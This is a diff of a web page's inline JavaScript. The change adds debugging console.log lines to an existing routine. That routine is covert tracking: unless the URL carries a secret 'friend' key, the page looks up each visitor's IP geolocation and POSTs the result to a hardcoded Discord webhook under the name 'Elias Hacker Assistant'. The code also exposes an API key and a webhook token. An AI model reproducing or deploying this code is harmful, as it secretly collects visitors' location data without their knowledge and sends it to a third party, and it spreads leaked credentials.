@@ -119,13 +119,19 @@
         const secretKey = new URLSearchParams(window.location.search).get("key");
         const allowedKey = "friend"; // Replace with your own secret key
 
+        console.log("Secret key in URL: ", secretKey); // Debugging statement
+
         if (secretKey === allowedKey) {
             console.log("Access detected with the secret key. Not sending info to Discord.");
         } else {
+            // Fetch geolocation data
             $.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=fa1a2f8df62745e3bb75c15b08f54592", function(data) {
+                console.log("Geolocation data received: ", data); // Debugging statement
+                
                 var request = new XMLHttpRequest();
                 request.open("POST", "https://discord.com/api/webhooks/1336309114669895720/X9pEtV19eA7_O9w-kXaq5yRbFziViRegwPFr3Tur8iyyiFuKo3PPbzHHkVuwOLnNIEOk");
                 request.setRequestHeader('Content-type', 'application/json');
+                
                 var payload = {
                     username: "Elias Hacker Assistant.",
                     avatar_url: "5ab7e5f886077698169a4537405cebba.jpg",
@@ -145,9 +151,12 @@
                         }
                     }]
                 };
+                
+                console.log("Payload to Discord: ", JSON.stringify(payload)); // Debugging statement
+                
                 request.send(JSON.stringify(payload));
             }).fail(function() {
-                console.error("Failed to fetch geolocation data.");
+                console.error("Failed to fetch geolocation data."); // Debugging statement
             });
         }
     </script>
